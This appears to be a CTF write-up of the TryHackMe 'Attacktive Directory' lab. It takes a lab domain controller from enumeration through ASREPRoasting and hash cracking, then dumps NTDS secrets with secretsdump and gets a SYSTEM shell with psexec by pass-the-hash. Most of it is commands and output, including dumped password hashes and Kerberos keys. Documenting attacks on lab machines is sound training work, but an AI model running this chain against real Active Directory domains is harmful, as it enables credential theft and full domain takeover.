---
layout: single
title: Attacking Kerberos with ASREPRoasting & Abusing Backup Operators Group to Extract NTDS.DIT
excerpt: "TryHackMe CTF: 99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller? "
date: 2020-08-05
classes: wide
header:
  teaser_home_page: true
categories:
  - active directory
  - thm
permalink: /thm/AttacktiveDirectory
tags: [ AD, enum4linux, smbmap, smbclient, kerbrute, kerberos, pass the hash, secretdump, psexec]

---

TryHackMe CTF: 99% of Corporate networks run off of AD. But can you exploit a vulnerable Domain Controller? 

### Scanning the target host for open ports. Basic enumeration tactics will yield a number of ports open. Using a popular enumeration tool that's built on Linux 4 Windows will reveal some information, not a lot to work with however.
 
 ```bash   
 $ nmap 10.10.33.162 -sV     
                             
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-05 16:20 +08
    Nmap scan report for 10.10.33.162
    Host is up (0.37s latency).
    Not shown: 987 closed ports
    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain?
    80/tcp   open  http          Microsoft IIS httpd 10.0
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-08-05 08:21:16Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
    445/tcp  open  microsoft-ds?
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  tcpwrapped
    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
    3269/tcp open  tcpwrapped
    3389/tcp open  ms-wbt-server Microsoft Terminal Services
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port53-TCP:V=7.80%I=7%D=8/5%Time=5F2A6C00%P=x86_64-pc-linux-gnu%r(DNSVe
    SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
    SF:04bind\0\0\x10\0\x03");
    Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 203.33 seconds
   ```
 
### Enumerate SMB with enum4linux

```bash
$ enum4linux -a spookysec.local

Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Aug  5 19:19:36 2020

	 ========================== 
	|    Target Information    |
	 ========================== 
	Target ........... spookysec.local
	RID Range ........ 500-550,1000-1050
	Username ......... ''
	Password ......... ''
	Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


	 ======================================================= 
	|    Enumerating Workgroup/Domain on spookysec.local    |
	 ======================================================= 
	[+] Got domain/workgroup name: THM-AD

	 =============================================== 
	|    Nbtstat Information for spookysec.local    |
	 =============================================== 
	Looking up status of 10.10.237.175
	        ATTACKTIVEDIREC <00> -         B <ACTIVE>  Workstation Service
	        THM-AD          <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	        THM-AD          <1c> - <GROUP> B <ACTIVE>  Domain Controllers
	        THM-AD          <1b> -         B <ACTIVE>  Domain Master Browser
	        ATTACKTIVEDIREC <20> -         B <ACTIVE>  File Server Service

	        MAC Address = 02-4D-80-A3-99-4E

	 ======================================== 
	|    Session Check on spookysec.local    |
	 ======================================== 
	[+] Server spookysec.local allows sessions using username '', password ''

	 ============================================== 
	|    Getting domain SID for spookysec.local    |
	 ============================================== 
	Domain Name: THM-AD
	Domain Sid: S-1-5-21-3591857110-2884097990-301047963
	[+] Host is part of a domain (not a workgroup)

	 ========================================= 
	|    OS information on spookysec.local    |
	 ========================================= 
	Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
	[+] Got OS info for spookysec.local from smbclient: 
	[+] Got OS info for spookysec.local from srvinfo:
	Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

	 ================================ 
	|    Users on spookysec.local    |
	 ================================ 
	[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

	[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

	 ============================================ 
	|    Share Enumeration on spookysec.local    |
	 ============================================ 

	        Sharename       Type      Comment
	        ---------       ----      -------
	SMB1 disabled -- no workgroup available

	[+] Attempting to map shares on spookysec.local

	 ======================================================= 
	|    Password Policy Information for spookysec.local    |
	 ======================================================= 
	[E] Unexpected error from polenum:


	[+] Attaching to spookysec.local using a NULL share

	[+] Trying protocol 139/SMB...

	        [!] Protocol failed: Cannot request session (Called Name:SPOOKYSEC.LOCAL)

	[+] Trying protocol 445/SMB...

	        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.


	[E] Failed to get password policy with rpcclient


	 ================================= 
	|    Groups on spookysec.local    |
	 ================================= 

	[+] Getting builtin groups:

	[+] Getting builtin group memberships:

	[+] Getting local groups:

	[+] Getting local group memberships:

	[+] Getting domain groups:

	[+] Getting domain group memberships:

	 ========================================================================== 
	|    Users on spookysec.local via RID cycling (RIDS: 500-550,1000-1050)    |
	 ========================================================================== 
	[I] Found new SID: S-1-5-21-3591857110-2884097990-301047963
	[I] Found new SID: S-1-5-21-3532885019-1334016158-1514108833
	[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''
	S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
	S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
	S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
	S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
	S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)


	[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''
	S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
	S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
	S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
	S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
	S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
	S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
	S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
	S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
	S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
	S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
	S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
	S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
	S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
	S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
	S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
	S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
	S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
	S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)


	 ================================================ 
	|    Getting printer info for spookysec.local    |
	 ================================================ 
	Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


	enum4linux complete on Wed Aug  5 19:19:36 2020
```

## ****Introduction**:**

### A whole host of other services are running, including **Kerberos**. Kerberos is a key authentication service within Active Directory. With this port open, we can use a tool called [Kerbrute](https://github.com/ropnop/kerbrute/releases) (by Ronnie Flathers [@ropnop](https://twitter.com/ropnop)) to brute force discovery of users, passwords and even password spray!

## **Enumeration**

### For this box, a modified [User List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt) and [Password List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt) will be used to cut down on time of enumeration of users and password hash cracking. It is **NOT** recommended to brute force credentials due to account lockout policies that we cannot enumerate on the domain controller.
### Using kerbrute userenum to enumerate valid domain usernames via Kerberos

```bash
$ kerbrute userenum -d spookysec.local --dc spookysec.local userlist.txt -t 100

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/05/20 - Ronnie Flathers @ropnop

2020/08/05 19:28:02 >  Using KDC(s):
2020/08/05 19:28:02 >  	spookysec.local:88

2020/08/05 19:28:03 >  [+] VALID USERNAME:	 james@spookysec.local
2020/08/05 19:28:03 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2020/08/05 19:28:04 >  [+] VALID USERNAME:	 James@spookysec.local
2020/08/05 19:28:04 >  [+] VALID USERNAME:	 robin@spookysec.local
2020/08/05 19:28:07 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2020/08/05 19:28:09 >  [+] VALID USERNAME:	 administrator@spookysec.local
2020/08/05 19:28:13 >  [+] VALID USERNAME:	 backup@spookysec.local
2020/08/05 19:28:15 >  [+] VALID USERNAME:	 paradox@spookysec.local
2020/08/05 19:28:26 >  [+] VALID USERNAME:	 JAMES@spookysec.local
2020/08/05 19:28:30 >  [+] VALID USERNAME:	 Robin@spookysec.local
2020/08/05 19:28:53 >  [+] VALID USERNAME:	 Administrator@spookysec.local
2020/08/05 19:29:39 >  [+] VALID USERNAME:	 Darkstar@spookysec.local
2020/08/05 19:29:54 >  [+] VALID USERNAME:	 Paradox@spookysec.local
2020/08/05 19:30:44 >  [+] VALID USERNAME:	 DARKSTAR@spookysec.local
2020/08/05 19:30:59 >  [+] VALID USERNAME:	 ori@spookysec.local
2020/08/05 19:31:25 >  [+] VALID USERNAME:	 ROBIN@spookysec.local
2020/08/05 19:34:09 >  Done! Tested 100000 usernames (16 valid) in 366.575 seconds
```

## Exploitation

### After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called **ASREPRoasting.** ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

### [Impacket](https://github.com/SecureAuthCorp/impacket) has a tool called "GetNPUsers.py" (located in Impacket/Examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

### Use GetNPUsers.py to achieve kerberos ticket and try to decrypt it. Then, copy the hash and save as hash.txt

```bash
$ python3 GetNPUsers.py spookysec.local/svc-admin -no-pass  

Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f3bd08fb7f7fXXXXXX57b5cc45c3a0cb$6a1732c7f9fc364ed020756f1124123e59464edf5b2a3e1490a80bb0da8e75ce3843c0f3ee91468e4e2a51c13762df1e132002324cbc6dbd04af1e2dd1d35e3f4a2b9c7af09424990cd0b746ea3f65ae985df73aee7b6412b3ece3e602fabbe45ccca335dca81973befcb91a48bb4d0020332acXXXXXXfa4a69729f051a89409f00303384f90d684a3dfd5ee66a2445b27268d38c75d32bb6b6c61201e5c0c9e78cdd0c8f5b329f47d9749371119032667b0e601eab3367490a2b6466cc8f5082bad3a13d2ac849130ec1207d53008c31397fa75d74573cba4dd96abb76e8202adcf99f1086a84756cb9bf35acc503ec58e5
```

### Try to decrypt the hash with john

```bash
$ sudo john hash.txt --wordlist=passwordlist.txt  
                                                
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
managemXXXXX05   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)
1g 0:00:00:00 DONE (2020-08-05 19:51) 3.333g/s 23893p/s 23893c/s 23893C/s horoscope..frida
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.

```bash
$ smbmap -H spookysec.local -d spookysec.local -u svc-admin -p managemXXXXX05           
     
[+] IP: spookysec.local:445	Name: unknown                                           
        Disk              Permissions	Comment
	----              -----------	-------
	ADMIN$            NO ACCESS	Remote Admin
	backup            READ ONLY	
	C$                NO ACCESS	Default share
	IPC$              READ ONLY	Remote IPC
	NETLOGON          READ ONLY	Logon server share 
	SYSVOL            READ ONLY	Logon server share
	
``` 

### View user file using smbclient

``` bash
$ smbclient \\\\spookysec.local\\backup --user svc-admin                        

Enter WORKGROUP\svc-admin's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr  5 03:08:39 2020
  ..                                  D        0  Sun Apr  5 03:08:39 2020
  backup_credentials.txt              A       48  Sun Apr  5 03:08:53 2020
get
		8247551 blocks of size 4096. 5266965 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> exit
``` 

### View backup_credentials.txt file

``` bash
$ cat backup_credentials.txt          
                                   
YmFja3VwQHNwb29reXNlYy5XXXXXbDpiYWNrdXAyNTE3ODYw%
``` 

### Decode it with base64. Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account "backup" gets us thinking. What is this the backup account to? Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. If we manage to compromise a user account that is member of the Backup Operators group, we can then abuse it's SeBackupPrivilege to create a shadow copy of the current state of the DC, extract the ntds.dit database file, dump the hashes and escalate our privileges to DA.

``` bash
$ base64 -d backup_credentials.txt             
                                              
backup@spookysec.local:backXXXXX7860
``` 

### Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain. Let's dump the hash.
### DRSUAPI method allows us to dump NTDS.DIT
### Pass The Hash (PTH) method of attack could allow us to authenticate as the user without the password.

```bash
$ python3 secretsdump.py -just-dc backup@spookysec.local      
  
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404XXXXX3b435b51404ee:e4876a80aXXXXX2986d7609aa5ebc12b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:0b786eea66c36d3a6bdb5a46a9441840:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:c431e7e3555aeb5b63cbdfee3024d56f4b7f10eaba6c3f94d9a1524e76a26a49
Administrator:aes128-cts-hmac-sha1-96:f955ac2d89620b2a8dcd9837105445ff
Administrator:des-cbc-md5:6d5edfa173d9d6ae
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:bbdc500169265044b81c63f356fd3326d73b5b83dc3b12dc9f5adcee9c69531d
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:a74b9a67c48f6c28c06f776b0cf03118
ATTACKTIVEDIREC$:des-cbc-md5:f79219863426ecce
[*] Cleaning up...
``` 

### Login to admin with psexec.py

``` bash
$ python3 psexec.py Administrator:@spookysec.local -hashes aad3b435b51404XXXXX3b435b51404ee:e4876a80aXXXXX2986d7609aa5ebc12b

Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on spookysec.local.....
[*] Found writable share ADMIN$
[*] Uploading file MzOQcUCs.exe
[*] Opening SVCManager on spookysec.local.....
[*] Creating service trwO on spookysec.local.....
[*] Starting service trwO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami && hostname      
nt authority\system
AttacktiveDirectory
``` 
